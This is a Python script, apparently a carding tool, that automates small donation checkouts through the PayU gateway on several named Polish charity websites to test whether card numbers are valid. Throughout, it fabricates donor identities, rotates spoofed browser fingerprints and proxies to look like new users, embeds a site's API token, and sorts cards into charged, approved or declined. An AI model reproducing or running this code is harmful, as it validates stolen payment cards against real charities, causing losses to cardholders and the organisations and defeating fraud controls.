
"""
PayU card checker — centaurus.org.pl donation flow.

Full checkout replayed from a HAR capture:
  1. merchant create order (amount/currency/country + generated identity)
  2. tokenize the card           (Bearer JWT from the redirect URL)
  3. submit payment              (token + browserData fingerprint)
  4. 3DS poll (if the submit returns a threeds continueUrl)
  5. read the final /status result

Every run creates a fresh order + fresh identity (no session reuse), so each
checkout looks like a brand-new user. Uses the same curl_cffi impersonation
profiles as the Shopify checker.
"""
from __future__ import annotations

import asyncio
import random
import re
import time
import urllib.parse
import os
import itertools
from dataclasses import dataclass, field
from typing import Optional, Tuple

from curl_cffi.requests import AsyncSession

# ── browser profile (same as Shopify v7) ─────────────────────────────
PROFILE_UA = {
    "chrome131": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "chrome133a": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "chrome136": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "chrome142": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "chrome145": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "chrome146": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "chrome150": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "firefox135": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
    "firefox144": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
    "safari180": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "safari153": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
}
BROWSER_PROFILES = list(PROFILE_UA.keys())

FIRST_NAMES = ['james', 'john', 'robert', 'michael', 'william', 'david', 'richard', 'joseph',
               'thomas', 'charles', 'daniel', 'matthew', 'anthony', 'mark', 'donald', 'steven',
               'paul', 'andrew', 'joshua', 'kenneth', 'kevin', 'brian', 'george', 'edward',
               'ronald', 'timothy', 'jason', 'jeffrey', 'ryan', 'jacob', 'mary', 'patricia',
               'jennifer', 'linda', 'elizabeth', 'barbara', 'susan', 'jessica', 'sarah', 'karen']
LAST_NAMES = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis',
              'rodriguez', 'martinez', 'anderson', 'taylor', 'thomas', 'moore', 'jackson',
              'martin', 'lee', 'white', 'harris', 'clark', 'lewis', 'robinson', 'walker',
              'young', 'allen', 'king', 'wright', 'scott', 'torres', 'nguyen', 'hill', 'flores']
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com", "aol.com", "mail.com"]


def generate_identity() -> Tuple[str, str, str]:
    """Fresh first name, last name, email for a new-user checkout."""
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    local = f"{first}{last}{random.randint(1, 999)}"
    email = f"{local}@{random.choice(EMAIL_DOMAINS)}"
    return first, last, email


# ── PayU endpoints ────────────────────────────────────────────────────
PAYU_BASE = "https://secure.payu.com"
PAYU_PAY_URL = PAYU_BASE + "/pay/"

# ── PayU sites (merchant create endpoint per site) ───────────────────
PAYU_SITES = {
    "centaurus": {
        "create_url": "https://centaurus.org.pl/wp-json/centaurus/v1/payu/create",
        "create_type": "json",
        "referer": "https://centaurus.org.pl/en/donate/",
        "origin": "https://centaurus.org.pl",
        "amount": "1",
        "mcp_fx_table_id": None,
        "mcp_fx_rate": None,
        "language": "en",
        "lang_param": "&lang=en",
        "country": "IN",
        "timezone_offset": -330,
        "extra_payload": {
            "currency": "usd",
            "target_id": "foundation",
            "terms": True,
            "newsletter": False,
            "payment_type": "one-time",
            "subscription": 0,
        },
    },
    "fundacjaadamhadlaw": {
        "create_url": "https://fundacjaadamhadlaw.pl/przekaz-darowizne/",
        "create_type": "form",
        "referer": "https://fundacjaadamhadlaw.pl/przekaz-darowizne/",
        "origin": "https://fundacjaadamhadlaw.pl",
        "amount": "10",
        "mcp_fx_table_id": 597551,
        "mcp_fx_rate": 1,
        "language": "en",
        "lang_param": "",
        "country": "PL",
        "timezone_offset": -60,
        "form_fields": {
            "flexible_donation[first_name]": "{first}",
            "flexible_donation[last_name]": "{last}",
            "flexible_donation[email]": "{email}",
            "flexible_donation[amount]": "10",
            "flexible_donation[comment]": "",
            "flexible_donation[payment_method]": "payu",
            "flexible_donation[terms]": "yes",
            "flexible_donation[anonymous_data]": "no",
            "flexible_donation[anonymous_amount]": "no",
            "flexible_donation[form_id]": "138",
            "flexible_donation[send_donation]": "Wy\u015blij darowizn\u0119",
        },
    },
    "rehabilitacjaopole": {
        "create_url": "https://rehabilitacjaopole.pl/darowizny/",
        "create_type": "utf",
        "referer": "https://rehabilitacjaopole.pl/darowizny/",
        "origin": "https://rehabilitacjaopole.pl",
        "amount": "10",
        "mcp_fx_table_id": 597551,
        "mcp_fx_rate": 1,
        "language": "en",
        "lang_param": "",
        "country": "PL",
        "timezone_offset": -60,
        "donation_form": {
            "radio": "amount_10",
            "first_name": "{first}",
            "last_name": "{last}",
            "email": "{email}",
            "desc": "Darowizna",
            "phone": "",
            "stan": "1",
            "warunki": "on",
            "donate": "WSPIERAM",
        },
    },
    "magnaliadei": {
        "create_url": "https://magnaliadei.pl/ajax/dotacja&rid=119",
        "create_type": "ajax",
        "referer": "https://magnaliadei.pl/przekaz-darowizne-przez-payu",
        "origin": "https://magnaliadei.pl",
        "amount": "10",
        "mcp_fx_table_id": 597551,
        "mcp_fx_rate": 1,
        "language": "pl",
        "lang_param": "",
        "country": "PL",
        "timezone_offset": -60,
        "donation_form": {
            "first_name": "{first}",
            "last_name": "{last}",
            "email": "{email}",
            "amount": "10",
            "customAmount": "10",
            "newsletter": "on",
            "terms_accept": "on",
            "gdpr_consent": "on",
        },
    },
    "odbuduj_sokolowsko": {
        "create_url": "https://odbuduj.sokolowsko.org/przekaz-darowizne/",
        "create_type": "form",
        "referer": "https://odbuduj.sokolowsko.org/przekaz-darowizne/",
        "origin": "https://odbuduj.sokolowsko.org",
        "amount": "5",
        "mcp_fx_table_id": 597551,
        "mcp_fx_rate": 1,
        "language": "pl",
        "lang_param": "",
        "country": "PL",
        "timezone_offset": -60,
        "form_fields": {
            "amount": "custom",
            "custom_amount": "5",
            "first_name": "{first}",
            "last_name": "{last}",
            "email": "{email}",
            "phone": "",
            "data_processing": "on",
            "agree_regulations": "on",
            "payu_send": "",
        },
    },
    "kocipazur": {
        "create_url": "https://kocipazur.org/wspomoz/przekaz-darowizne/",
        "create_type": "form_nonce",
        "nonce_field": "kocipazur_donate",
        "nonce_pattern": r'name="kocipazur_donate" value="([^"]+)"',
        "referer": "https://kocipazur.org/wspomoz/przekaz-darowizne/",
        "origin": "https://kocipazur.org",
        "amount": "5",
        "mcp_fx_table_id": 597551,
        "mcp_fx_rate": 1,
        "language": "pl",
        "lang_param": "",
        "country": "PL",
        "timezone_offset": -60,
        "form_fields": {
            "firstname": "{first}",
            "lastname": "{last}",
            "email": "{email}",
            "donation_value": "5",
        },
    },
    "efektmotyla": {
        "create_type": "api_orders",
        "add_url": "https://api.efektmotyla.ngo/orders/add/",
        "pay_url": "https://api.efektmotyla.ngo/orders/pay/",
        "auth_token": "c02093aeca6bf1b582c651507a70577727a0c0d8",
        "referer": "https://efektmotyla.ngo/",
        "origin": "https://efektmotyla.ngo",
        "amount": "10",
        "mcp_fx_table_id": 597551,
        "mcp_fx_rate": 1,
        "language": "en",
        "lang_param": "",
        "country": "PL",
        "timezone_offset": -60,
        "fundraising": 557,
        "description": "Pom\u00f3\u017c Stworzy\u0107 Godne Warunki \u2013 Wesprzyj Remont \u0141azienki i Kuchni dla Potrzebuj\u0105cej Rodziny",
    },
    "zbieramtowszkole": {
        "create_url": "https://www.zbieramtowszkole.pl/przekaz-darowizne/wplac",
        "page_url": "https://www.zbieramtowszkole.pl/przekaz-darowizne",
        "create_type": "form_nonce",
        "nonce_field": "csrf_hash_name",
        "nonce_pattern": r'name="csrf_hash_name" value="([^"]+)"',
        "referer": "https://www.zbieramtowszkole.pl/przekaz-darowizne",
        "origin": "https://www.zbieramtowszkole.pl",
        "amount": "5",
        "mcp_fx_table_id": 597551,
        "mcp_fx_rate": 1,
        "language": "pl",
        "lang_param": "",
        "country": "PL",
        "timezone_offset": -60,
        "form_fields": {
            "price": "5",
            "name": "{first}",
            "surname": "{last}",
            "email": "{email}",
            "is-institution": "private",
            "school": "",
            "class": "",
            "terms_accept": "on",
        },
    },
}

# ── real device profiles (screen / color depth) ──────────────────────
DEVICE_PROFILES = [
    {"screenWidth": 1920, "screenHeight": 1080, "colorDepth": 24},
    {"screenWidth": 1366, "screenHeight": 768,  "colorDepth": 24},
    {"screenWidth": 1536, "screenHeight": 864,  "colorDepth": 24},
    {"screenWidth": 1440, "screenHeight": 900,  "colorDepth": 32},
    {"screenWidth": 2560, "screenHeight": 1440, "colorDepth": 24},
    {"screenWidth": 1280, "screenHeight": 720,  "colorDepth": 24},
    {"screenWidth": 1680, "screenHeight": 1050, "colorDepth": 24},
    {"screenWidth": 3840, "screenHeight": 2160, "colorDepth": 24},
]

# ── global checkout rate limiter (delay between checkouts) ────────────
CHECKOUT_DELAY = float(os.environ.get("PAYU_CHECKOUT_DELAY", "3"))
_last_checkout_ts = 0.0
_rate_lock = asyncio.Lock()


async def _throttle():
    global _last_checkout_ts
    async with _rate_lock:
        wait = CHECKOUT_DELAY - (time.time() - _last_checkout_ts)
        if wait > 0:
            await asyncio.sleep(wait)
        _last_checkout_ts = time.time()


def parse_card(cc: str) -> Tuple[str, str, str, str]:
    """cc format: number|MM|YYYY|cvv  (same as Shopify)."""
    parts = str(cc).strip().split("|")
    if len(parts) != 4:
        raise Exception(f"invalid card format: {cc}")
    number, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if len(year) == 2:
        year = "20" + year
    return number, month, year, cvv


# ── result mapping ────────────────────────────────────────────────────
# PayU /status "value" -> normalized code (Shopify-style vocabulary)
PAYU_RESULT_MAP = {
    # outcome
    "SUCCESS": "ORDER_PAID",
    # declines
    "CARD_INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "CARD_EXPIRED": "EXPIRE_CARD",
    "CARD_NOT_ACTIVE": "CARD_DECLINED",
    "CARD_STOLEN": "STOLEN_CARD",
    "CARD_LOST": "LOST_CARD",
    "CARD_INVALID": "INVALID_PAYMENT_METHOD",
    "CARD_CVV_INVALID": "INCORRECT_CVC",
    "CARD_DECLINED": "CARD_DECLINED",
    "CARD_REJECTED": "CARD_DECLINED",
    "REFUSED_BY_ISSUER": "CARD_DECLINED",
    "DECLINED_BY_ISSUER": "CARD_DECLINED",
    "NOT_AUTHORIZED": "CARD_DECLINED",
    "NOT_ACCEPTED": "CARD_DECLINED",
    "3DS_NOT_AUTHORIZED": "3DS_FAILED",
    "CARD_BLACKLISTED": "RESTRICTED_CARD",
    "BLOCKED_CARD": "RESTRICTED_CARD",
    "BLACKLISTED_CARD": "RESTRICTED_CARD",
    "LIMIT_EXCEEDED": "LIMIT_EXCEEDED",
    "FRAUD_DETECTED": "FRAUD_SUSPECTED",
    "GENERAL_ERROR": "GENERIC_ERROR",
    "INVALID_TRANSACTION": "GENERIC_ERROR",
    "3DS_AUTHENTICATION_FAILED": "3DS_FAILED",
    "CARD_3DS_REQUIRED": "3DS_REQUIRED",
    "3DS_AUTHENTICATION_REQUIRED": "3DS_REQUIRED",
    "AMOUNT_TOO_HIGH": "AMOUNT_TOO_HIGH",
    "AMOUNT_TOO_LOW": "AMOUNT_TOO_SMALL",
    "CURRENCY_NOT_SUPPORTED": "NOT_SUPPORTED",
    "CARD_NOT_SUPPORTED": "NOT_SUPPORTED",
    "WAITING_FOR_CONFIRMATION": "PROCESSING",
    "PENDING": "PROCESSING",
}

# normalized code -> clean label
APPROVED_CODES = {"INSUFFICIENT_FUNDS", "3DS_REQUIRED", "INCORRECT_CVC", "INCORRECT_ZIP", "EXPIRE_CARD"}


def response_label(code: str) -> str:
    u = (code or "").upper()
    if u == "ORDER_PAID":
        return "CHARGED"
    if u in APPROVED_CODES:
        return "APPROVED"
    if u in ("PROCESSING", "PENDING", "WAITING"):
        return "PENDING"
    return "DECLINED"


@dataclass
class PayuResult:
    cc: str
    response_code: str
    response: str
    real_response: str
    amount: str
    currency: str = "USD"
    gateway: str = "PayU"
    error: Optional[Exception] = None


def _browser_data(user_agent: str, timezone_offset: int) -> dict:
    d = random.choice(DEVICE_PROFILES)
    return {
        "screenWidth": d["screenWidth"],
        "javaEnabled": False,
        "timezoneOffset": timezone_offset,
        "screenHeight": d["screenHeight"],
        "userAgent": user_agent,
        "colorDepth": d["colorDepth"],
        "language": "en-US",
        "challengeWindowSize": "04",
    }


async def run_payu_check(amount: str, card_entry: str, proxy_url: str = "",
                         site: str = "centaurus") -> PayuResult:
    """Run a full PayU checkout for one card. Every call = fresh order + fresh user."""
    await _throttle()
    number, month, year, cvv = parse_card(card_entry)
    first, last, email = generate_identity()
    full_name = f"{first} {last}"
    cfg = PAYU_SITES.get(site, PAYU_SITES["centaurus"])

    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = PROFILE_UA[impersonate]

    headers = {
        "User-Agent": user_agent,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
    }

    def new_session() -> AsyncSession:
        s = AsyncSession(impersonate=impersonate, timeout=30)
        s.headers.update(headers)
        if proxy_url:
            s.proxies = {"http": proxy_url, "https": proxy_url}
        return s

    s = new_session()

    try:
        # 1. create the order on the merchant (json API or html form + redirect)
        if cfg["create_type"] == "api_orders":
            add_body = {
                "fundraising": cfg["fundraising"],
                "moneybox": None,
                "total": int(float(cfg["amount"])),
                "currency": "PLN",
                "donator": full_name,
                "donator_email": email,
                "support_words": "",
                "is_anonymous": False,
            }
            ah = {"Content-Type": "application/json", "Origin": cfg["origin"], "Referer": cfg["referer"],
                  "Authorization": f"Token {cfg['auth_token']}"}
            r = await s.post(cfg["add_url"], json=add_body, headers=ah)
            if r.status_code not in (200, 201):
                raise Exception(f"orders/add failed: HTTP {r.status_code} {r.text[:150]}")
            order_id = r.json().get("id")
            if not order_id:
                raise Exception("orders/add: no order id")
            pay_body = {
                "order": order_id,
                "amount_required": f"{cfg['amount']}.00",
                "description": cfg["description"],
                "currency": "PLN",
                "payment_method": "c",
                "blik_code": "",
            }
            r2 = await s.post(cfg["pay_url"], json=pay_body, headers=ah)
            if r2.status_code != 200:
                raise Exception(f"orders/pay failed: HTTP {r2.status_code} {r2.text[:150]}")
            redirect = (r2.json().get("data") or "") if r2.headers.get("Content-Type", "").startswith("application/json") else ""
        elif cfg["create_type"] == "form_nonce":
            # GET the page -> extract the anti-CSRF nonce + session cookie
            page_url = cfg.get("page_url") or cfg["create_url"]
            post_url = cfg.get("post_url") or cfg["create_url"]
            r = await s.get(page_url, headers={"Referer": cfg["referer"]})
            m = re.search(cfg["nonce_pattern"], r.text)
            if not m:
                raise Exception("form_nonce: nonce not found")
            nonce_val = m.group(1)
            form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["form_fields"].items()}
            form[cfg["nonce_field"]] = nonce_val
            r2 = await s.post(
                post_url, data=form, allow_redirects=False,
                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                         "Content-Type": "application/x-www-form-urlencoded"})
            redirect = r2.headers.get("Location") or ""
        elif cfg["create_type"] == "ajax":
            form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["donation_form"].items()}
            r = await s.post(
                cfg["create_url"], data=form,
                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                         "Content-Type": "application/x-www-form-urlencoded",
                         "X-Requested-With": "XMLHttpRequest"})
            data = r.json()
            redirect = data.get("href") or ""
        elif cfg["create_type"] == "utf":
            # two-step: donation form -> HTML with NewPayment form -> NewPayment -> redirect
            form = {k: v.format(first=first, last=last, email=email) for k, v in cfg["donation_form"].items()}
            r = await s.post(
                cfg["create_url"], data=form,
                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                         "Content-Type": "application/x-www-form-urlencoded"})
            hidden = dict(re.findall(r'name="([^"]+)"\s+value="([^"]*)"', r.text))
            if "pos_id" not in hidden:
                raise Exception("utf create: NewPayment form not found")
            r2 = await s.post(
                PAYU_BASE + "/paygw/UTF/NewPayment", data=hidden, allow_redirects=False,
                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                         "Content-Type": "application/x-www-form-urlencoded"})
            redirect = r2.headers.get("Location") or ""
        elif cfg["create_type"] == "form":
            form = {}
            for k, v in cfg["form_fields"].items():
                form[k] = v.format(first=first, last=last, email=email)
            r = await s.post(
                cfg["create_url"], data=form, allow_redirects=False,
                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                         "Content-Type": "application/x-www-form-urlencoded"})
            redirect = r.headers.get("Location") or ""
        else:
            create_payload = {
                "amount": float(amount) if amount else cfg["amount"],
                "full_name": full_name,
                "email": email,
                "country": cfg["country"],
            }
            create_payload.update(cfg["extra_payload"])
            r = await s.post(
                cfg["create_url"], json=create_payload,
                headers={"Referer": cfg["referer"], "Origin": cfg["origin"],
                         "Content-Type": "application/json"})
            if r.status_code != 200:
                raise Exception(f"create order failed: HTTP {r.status_code} {r.text[:200]}")
            create = r.json()
            redirect = create.get("redirect") or ""
        if not redirect:
            raise Exception("create order: missing redirect")

        # parse orderId + JWT from the redirect URL
        parsed = urllib.parse.urlparse(redirect)
        qs = urllib.parse.parse_qs(parsed.query)
        token = (qs.get("token") or [""])[0]
        order_id = (qs.get("orderId") or [""])[0]
        if not token or not order_id:
            raise Exception("create order: missing orderId/token in redirect")

        auth = {"Authorization": f"Bearer {token}"}
        payu_referer = PAYU_PAY_URL + "?orderId=" + order_id + "&token=" + urllib.parse.quote(token) + "&lang=en"
        api_headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "Origin": PAYU_BASE,
            "Referer": payu_referer,
        }

        # 2. fetch order details -> authoritative amount (minor units) + currency
        r = await s.get(f"{PAYU_BASE}/api/front/orders/{order_id}", headers=auth)
        if r.status_code != 200:
            raise Exception(f"order fetch failed: HTTP {r.status_code}")
        order = r.json()
        order_amount = order.get("amount") or int(float(amount) * 100)
        currency = (order.get("currency") or "USD").upper()

        # 3. tokenize the card (no name — optional per PayU)
        token_payload = {
            "posId": "PAYU S.A.",
            "type": "SINGLE",
            "card": {
                "number": number,
                "cvv": cvv,
                "expirationMonth": month,
                "expirationYear": year,
            },
        }
        r = await s.post(f"{PAYU_BASE}/api/front/tokens", json=token_payload, headers=api_headers)
        if r.status_code != 200:
            raise Exception(f"tokenize failed: HTTP {r.status_code}")
        tok = r.json()
        card_token = tok.get("value") or ""
        masked = tok.get("maskedCard") or (number[:6] + "******" + number[-4:])
        if not card_token:
            raise Exception("tokenize: no card token returned")

        # 4. submit the payment
        pay_payload = {
            "email": email,
            "firstName": first,
            "lastName": last,
            "currency": currency,
            "amount": order_amount,
            "payMethod": {
                "type": "c",
                "token": card_token,
                "cardDetails": {"maskedCardNumber": masked},
            },
            "metadata": {"cardInputTime": random.randint(3000, 8000)},
            "redirectUrl": PAYU_PAY_URL + "?orderId=" + order_id + "&token=%token%" + cfg["lang_param"],
            "mcpFxTableId": cfg["mcp_fx_table_id"],
            "mcpFxRate": cfg["mcp_fx_rate"],
            "browserData": _browser_data(user_agent, cfg["timezone_offset"]),
            "language": cfg["language"],
            "invoice": None,
        }
        r = await s.post(f"{PAYU_BASE}/api/front/orders/{order_id}/payments", json=pay_payload, headers=api_headers)
        if r.status_code != 200:
            body = ""
            try:
                body = r.text[:500]
            except Exception:
                pass
            raise Exception(f"payment submit failed: HTTP {r.status_code} {body}")

        pay_resp = r.json()

        # immediate decline?
        err_code = pay_resp.get("errorCode")
        if err_code:
            return _finalize(card_entry, err_code, amount, currency)

        # 5. 3DS flow (if the submit returned a threeds continueUrl)
        continue_url = pay_resp.get("continueUrl") or ""
        m = re.search(r"authenticationId=([A-Za-z0-9-]+)", continue_url)
        auth_id = m.group(1) if m else ""

        if auth_id:
            for _ in range(10):
                r = await s.get(f"{PAYU_BASE}/api/threeds/authentications/{auth_id}", headers=auth)
                if r.status_code != 200:
                    break
                auth_resp = r.json()
                auth_status = (auth_resp.get("status") or "").upper()
                three_ds = auth_resp.get("threeDsSupported")
                # a real challenge (issuer ACS) can't be automated -> 3DS_REQUIRED
                if three_ds and (auth_resp.get("challengeUrl") or auth_resp.get("redirectUrl") or auth_resp.get("acsUrl")):
                    return _finalize(card_entry, "CARD_3DS_REQUIRED", amount, currency)
                if auth_status in ("FINISHED", "FAILED", "ERROR", "AUTHENTICATION_FAILED", "COMPLETED", "SUCCESS"):
                    break
                await asyncio.sleep(1.0)

        # 6. poll the final status until a terminal category (SUCCESS/ERROR)
        value = ""
        for _ in range(12):
            r = await s.get(f"{PAYU_BASE}/api/front/orders/{order_id}/status", headers=auth)
            if r.status_code != 200:
                raise Exception(f"status fetch failed: HTTP {r.status_code}")
            status_resp = r.json()
            category = (status_resp.get("category") or "").upper()
            value = (status_resp.get("value") or "")
            if category == "SUCCESS":
                return _finalize(card_entry, "SUCCESS", amount, currency)
            if category == "ERROR":
                return _finalize(card_entry, value or "GENERAL_ERROR", amount, currency)
            # NEW / WAITING / IN_PROGRESS -> keep polling
            await asyncio.sleep(2.0)

        return _finalize(card_entry, value or "IN_PROGRESS", amount, currency)

    finally:
        try:
            await s.close()
        except Exception:
            pass


def _finalize(card_entry: str, real_value: str, amount: str, currency: str) -> PayuResult:
    code = PAYU_RESULT_MAP.get(real_value.upper(), real_value.upper())
    label = response_label(code)
    return PayuResult(
        cc=card_entry,
        response_code=code,
        response=label,
        real_response=real_value,
        amount=_fmt_amount(amount),
        currency=currency,
    )


def _fmt_amount(a: object) -> str:
    try:
        return f"{float(a):.2f}"
    except Exception:
        return str(a or "0.00")
